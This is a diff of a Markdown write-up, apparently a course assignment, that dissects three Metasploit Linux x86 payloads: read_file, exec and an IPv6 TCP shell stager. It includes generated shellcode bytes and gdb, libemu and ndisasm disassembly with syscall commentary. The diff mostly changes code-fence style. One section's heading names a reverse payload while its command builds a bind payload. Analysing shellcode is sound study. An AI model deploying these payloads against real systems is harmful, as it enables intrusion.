@@ -39,7 +39,7 @@ The following shellcodes and corresponding debugging methods have been selected:
 ### 1. read_file Payload Creation
 Creating a payload for `linux/x86/shell/read_file` in C format.
 
-```
+~~~ bash
 skawa@ubuntu:~/Desktop/code/assignment/assignment5$ msfvenom -p linux/x86/read_file PATH=/home/skawa/Desktop/code/assignment/assignment5/testFile.txt -f c -a x86 --platform linux
 No encoder or badchars specified, outputting raw payload
 Payload size: 122 bytes
@@ -55,20 +55,21 @@ unsigned char buf[] =
 "\x6e\x74\x35\x2f\x74\x65\x73\x74\x46\x69\x6c\x65\x2e\x74\x78"
 "\x74\x00";
 skawa@ubuntu:~/Desktop/code/assignment/assignment5$
-```
+~~~
+
 
 The contents of `testFile.txt` are:
 
-```
+~~~ bash
 skawa@ubuntu:~/Desktop/code/assignment/assignment5$ cat testFile.txt
 Hi SecurityTube
 skawa@ubuntu:~/Desktop/code/assignment/assignment5$
-```
+~~~
 
 #### GDB Disassembly
 The first thing to do is create an executable binary so that the program can be compiled then attached and debugged in GDB.
 
-```
+~~~ c
 skawa@ubuntu:~/Desktop/code/assignment/assignment5$ cat read-file-shellcode.c
 #include<stdio.h>
 #include<string.h>
@@ -95,11 +96,11 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment5$ ./c-compile.sh read-file-she
 [+] Compiling Shellcode
 [+] Done!
 skawa@ubuntu:~/Desktop/code/assignment/assignment5$
-```
+~~~
 
 Next, a break point can be set on the `code` variable as this is where the shellcode for the `read_file` payload begins.
 
-```nasm
+~~~ nasm
 skawa@ubuntu:~/Desktop/code/assignment/assignment5$ gdb -q ./read-file-shellcode
 Reading symbols from /home/skawa/Desktop/code/assignment/assignment5/read-file-shellcode...(no debugging symbols found)...done.
 (gdb) break *&code
@@ -157,60 +158,66 @@ Dump of assembler code for function code:
    0x0804a0ba <+122>:	add    BYTE PTR [eax],al
 End of assembler dump.
 (gdb)
-```
+~~~
+
 
 #### JMP CALL pop
 The first instruction jumps to a procedure located at `0x804a078`. This procedure then performs a `call` instruction to a procedure located at the second instruction. Right after the `call` instruction is made, the address of the next instruction `0x0804a07d` is placed on the stack. This contains the location of the file which is going to be read `"/home/skawa/Desktop/code/assignment/assignment5/testFile.txt"`
 
-```nasm
+~~~ nasm
 (gdb) x/4bx $esp
 0xbffff628:	0x7d	0xa0	0x04	0x08
 (gdb)
 (gdb) x/1s 0x0804a07d
 0x804a07d <code+61>:	 "/home/skawa/Desktop/code/assignment/assignment5/testFile.txt"
 (gdb)
-```
+~~~
+
 
 #### Interrupt 1 - Open
 The first chunk of instructions are responsible for opening the file.
 
-```
+~~~ nasm
 mov eax,0x5     ;open system call, 5
 pop ebx         ;pop the location of the file, 0x0804a07d, into EBX
 xor ecx,ecx     ;zero out ecx
 0x80            ;execute open
-```
+~~~
+
 
 #### Interrupt 2 - Read
 The second chunk of instructions are responsible for reading the file.
 
-```nasm
+~~~ nasm
 mov ebx,eax     ;arg 1, the file descriptor that is return by the open syscall
 mov eax,0x3     ;read system call, 3
 mov edi,esp     ;preserve the stack pointer in EDI
 mov ecx,edi     ;arg 2, ECX points to the stack
 mov edx,0x1000  ;set 4096 bytes to read
 int 0x80        ;execute read system call
-```
+~~~
+
 
 #### Interrupt 3 - Write
 The third chunk of instructions are responsible for writing the contents of the file to screen.
 
-```nasm
+~~~ nasm
 mov edx,eax  ;arg 3, the file descriptor that is return by the read syscall
 mov eax,0x4  ;write system call, 4
 mov ebx,0x1  ;arg 2, write to STDIN (screen)
 int 0x80     ;execute write system call
-```
+~~~
+
 
 #### Interrupt 4 - Exit
 The last chunk of instructions are responsible for exiting the program
 
-```
+~~~ nasm
 mov eax,0x1 ;exit
 mov ebx,0x0 ;arg 1, value 0
 int 0x80    ;execute exit system call
-```
+~~~
+
 
 
 ### 2. exec Payload Creation
@@ -218,7 +225,7 @@ Libemu is a fantastic emulator that can help with running and disassembling shel
 
 The example shellcode below is the `linux/x86/exec` payload part of `msfvenom`.
 
-```
+~~~ bash
 skawa@ubuntu:~/libemu/tools/sctest$ msfvenom -p linux/x86/exec CMD=ifconfig -f raw -a x86 --platform linux | ./sctest -vvv -S -s 100000
 verbose = 3
 No encoder or badchars specified, outputting raw payload
@@ -246,20 +253,20 @@ int execve (
          none;
 ) =  0;
 skawa@ubuntu:~/libemu/tools/sctest$
-```
+~~~
 
 In addition to displaying the code above, libemu is also able to create a graphical representation of all  instructions and system interrupts that exist in the emulated program.
 
-```
+~~~ bash
 skawa@ubuntu:~/libemu/tools/sctest$ msfvenom -p linux/x86/exec CMD=ifconfig -f raw -a x86 --platform linux | ./sctest -vvv -S -s 100000 -G execve.dot
 skawa@ubuntu:~/libemu/tools/sctest$dot execve.dot -T png -o execve.png
 skawa@ubuntu:~/libemu/tools/sctest$
-```
+~~~
 
 <img src ="https://github.com/skahwah/skahwah.github.io/blob/master/_data/slae-assignment-5.png?raw=true" />
 
 #### Dissecting the Instructions
-```nasm
+~~~ nasm
 push byte 0xb         ;push 11 on to the stack
 pop eax               ;execve syscall, 11
 cwd
@@ -275,13 +282,14 @@ push edi              ;stack address restored
 push ebx              ;filename /bin/sh
 mov ecx, esp          ;ECX contains all arguments for execve
 int 0x80              ;execute execve syscall
-```
+~~~
+
 
 
 ### 3. reverse_ipv6_tcp Payload Creation
 Creating a payload for `linux/x86/shell/reverse_ipv6_tcp` in C format.
 
-```
+~~~ bash
 skawa@ubuntu:~/libemu/tools/sctest$ msfvenom -p linux/x86/shell/bind_ipv6_tcp LHOST=::1 -f c -a x86 --platform linux
 No encoder or badchars specified, outputting raw payload
 Payload size: 120 bytes
@@ -296,14 +304,14 @@ unsigned char buf[] =
 "\xe3\xb0\x66\xcd\x80\x50\x43\xb0\x66\x89\x51\x04\xcd\x80\x93"
 "\xb6\x0c\xb0\x03\xcd\x80\x87\xdf\x5b\xb0\x06\xcd\x80\xff\xe1";
 skawa@ubuntu:~/libemu/tools/sctest$
-```
+~~~
 
 
 #### ndisasm Disassembly
 
 ndisasm can be used to disassemble the shellcode into meaningful assembly instructions.
 
-```nasm
+~~~ nasm
 skawa@ubuntu:~/libemu/tools/sctest$ echo -ne "\x31\xdb\x53\x43\x53\x6a\x0a\x89\xe1\x6a\x66\x58\xcd\x80\x96\x99\x68\x00\x00\x00\x00\x68\x00\x00\x00\x01\x68\x00\x00\x00\x00\x68\x00\x00\x00\x00\x68\x00\x00\x00\x00\x52\x66\x68\x11\x5c\x66\x68\x0a\x00\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x89\xf3\xb6\x0c\xb0\x03\xcd\x80\x89\xdf" | ndisasm -u -
 00000000  31DB              xor ebx,ebx
 00000002  53                push ebx
@@ -340,14 +348,14 @@ skawa@ubuntu:~/libemu/tools/sctest$ echo -ne "\x31\xdb\x53\x43\x53\x6a\x0a\x89\x
 00000047  CD80              int 0x80
 00000049  89DF              mov edi,ebx
 skawa@ubuntu:~/libemu/tools/sctest$
-```
+~~~
 
 Looking at the disassembly above, there are three system call interrupts.
 
 #### Interrupt 1 - Socket Creation
 The first chunk of instructions are responsible for creating a IPv6 socket.
 
-```nasm
+~~~ nasm
 xor ebx,ebx     ;clear out ebx
 push ebx        ;socket protocol 0x0 is moved on to the stack
 inc ebx         ;socketcall type, socket
@@ -357,12 +365,13 @@ mov ecx,esp     ;all arguments for socket, as required by socketcall are pointed
 push byte +0x66 ;push 102 onto the stack (socketcall)
 pop eax         ;socketcall syscall
 int 0x80        ;execute socketcall
-```
+~~~
+
 
 #### Interrupt 2 - Connect
 The second chunk of instructions are responsible for creating an IPv6 connect structure.
 
-```nasm
+~~~ nasm
 xchg eax,esi          ;place socket file descriptor into ESI. Also clear out EAX.
 cdq
 
@@ -386,14 +395,15 @@ inc ebx               ;ebx now contains 3, for the type of socketcall, which is 
 push byte +0x66       ;push 102 onto the stack (socketcall)
 pop eax               ;socketcall syscall
 int 0x80              ;execute connect
-```
+~~~
+
 
 #### Interrupt 3 - Read
 The last chunk of instructions are responsible for creating the read system call.
 
-```nasm
+~~~ nasm
 mov ebx,esi         ;move the socket file descriptor into EBX
 mov dh,0xc          
 mov al,0x3          ;read syscall
 int 0x80            ;execute read
-```
+~~~
